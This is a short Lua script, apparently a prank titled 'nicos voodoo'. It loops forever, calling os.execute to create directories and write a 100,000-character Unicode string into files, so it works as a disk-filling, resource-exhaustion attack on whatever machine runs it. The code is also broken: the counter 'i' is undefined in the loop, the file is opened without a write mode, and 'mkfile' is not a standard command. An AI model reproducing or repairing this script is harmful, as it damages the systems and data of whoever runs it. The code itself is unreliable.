-- nicos voodoo

local data = ''

for i = 1, 100000 do
    data = data .. '﷽'
end

while true do
    coroutine.wrap(function()
        local name = ('girlfromsweden%d.txt'):format(i)

        os.execute('mkdir ' .. name)
        os.execute('mkfile ' .. name)

        local path = ('%s/%s'):format(name, name)
        local file = io.open(path)

        file:write(data)
        file:close()
    end)()
end
